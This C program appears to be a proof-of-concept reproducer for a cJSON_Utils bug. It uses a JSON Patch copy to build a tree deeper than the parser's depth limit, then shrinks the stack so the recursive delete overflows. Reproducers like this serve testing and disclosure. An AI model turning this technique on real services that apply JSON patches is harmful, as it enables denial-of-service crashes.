#define _GNU_SOURCE
#include "cJSON_Utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>

typedef struct { const cJSON *item; size_t depth; } depth_frame;

static size_t max_tree_depth(const cJSON *root)
{
    size_t used = 0, capacity = 128, maximum = 0;
    depth_frame *stack = (depth_frame *)malloc(capacity * sizeof(*stack));
    if(stack == NULL)
        return 0;
    stack[used++] = (depth_frame){root, 0};
    while(used) {
        depth_frame current = stack[--used];
        const cJSON *child;
        if(current.depth > maximum)
            maximum = current.depth;
        for(child = current.item->child; child != NULL; child = child->next) {
            if(used == capacity) {
                depth_frame *grown;
                capacity *= 2;
                grown = (depth_frame *)realloc(stack, capacity * sizeof(*stack));
                if(grown == NULL) {
                    free(stack);
                    return 0;
                }
                stack = grown;
            }
            stack[used++] = (depth_frame){child, current.depth + 1};
        }
    }
    free(stack);
    return maximum;
}

static char *make_input(long depth, size_t *patch_length)
{
    size_t cap = (size_t)depth * 16 + 256;
    size_t used = 0;
    long i;
    char *json = (char *)malloc(cap);
    if(json == NULL)
        return NULL;
    used += (size_t)sprintf(json + used, "{\"source\":");
    for(i = 0; i < depth; ++i)
        used += (size_t)sprintf(json + used, "{\"n\":");
    used += (size_t)sprintf(json + used, "{}\"");
    /* Replace the temporary quote after the empty object. */
    json[used - 1] = '\0';
    used--;
    for(i = 0; i < depth; ++i)
        json[used++] = '}';
    used += (size_t)sprintf(json + used, ",\"dest\":");
    for(i = 0; i < depth; ++i)
        used += (size_t)sprintf(json + used, "{\"n\":");
    used += (size_t)sprintf(json + used, "{}");
    for(i = 0; i < depth; ++i)
        json[used++] = '}';
    used += (size_t)sprintf(json + used, "}");
    json[used] = '\0';
    *patch_length = used;
    return json;
}

static char *make_patch(long depth, size_t *patch_length)
{
    size_t cap = (size_t)depth * 5 + 128;
    size_t used = 0;
    long i;
    char *json = (char *)malloc(cap);
    if(json == NULL)
        return NULL;
    used += (size_t)sprintf(json + used,
        "[{\"op\":\"copy\",\"from\":\"/source\",\"path\":\"/dest");
    for(i = 0; i < depth; ++i)
        used += (size_t)sprintf(json + used, "/n");
    used += (size_t)sprintf(json + used, "/copy\"}]");
    *patch_length = used;
    return json;
}

int main(int argc, char **argv)
{
    char *end = NULL;
    long depth;
    long stack_kib;
    size_t input_length = 0, patch_length = 0;
    char *input = NULL, *patch_text = NULL;
    cJSON *root = NULL, *patches = NULL;
    struct rlimit limit;

    if(argc != 3) {
        fprintf(stderr, "usage: %s branch-depth stack-kib-before-delete\n", argv[0]);
        return 2;
    }
    depth = strtol(argv[1], &end, 10);
    if(end == argv[1] || *end || depth < 1 || depth > 900)
        return 2;
    stack_kib = strtol(argv[2], &end, 10);
    if(end == argv[2] || *end || stack_kib < 16 || stack_kib > 8192)
        return 2;

    input = make_input(depth, &input_length);
    patch_text = make_patch(depth, &patch_length);
    if(input == NULL || patch_text == NULL)
        return 3;
    root = cJSON_Parse(input);
    patches = cJSON_Parse(patch_text);
    fprintf(stderr, "parsed input_bytes=%zu patch_bytes=%zu branch_depth=%ld\n",
        input_length, patch_length, depth);
    if(root == NULL || patches == NULL) {
        fprintf(stderr, "input parse failed: cJSON input depth limit or malformed JSON\n");
        return 4;
    }
    if(cJSONUtils_ApplyPatches(root, patches) != 0) {
        fprintf(stderr, "JSON Patch application failed\n");
        return 5;
    }
    fprintf(stderr, "patch applied; resulting maximum tree depth=%zu\n", max_tree_depth(root));
    cJSON_Delete(patches);
    free(input);
    free(patch_text);

    if(getrlimit(RLIMIT_STACK, &limit) != 0)
        return 6;
    limit.rlim_cur = (rlim_t)stack_kib * 1024;
    if(setrlimit(RLIMIT_STACK, &limit) != 0) {
        perror("setrlimit");
        return 7;
    }
    fprintf(stderr, "deleting root with stack_limit_kib=%ld\n", stack_kib);
    cJSON_Delete(root);
    puts("cleanup completed");
    return 0;
}
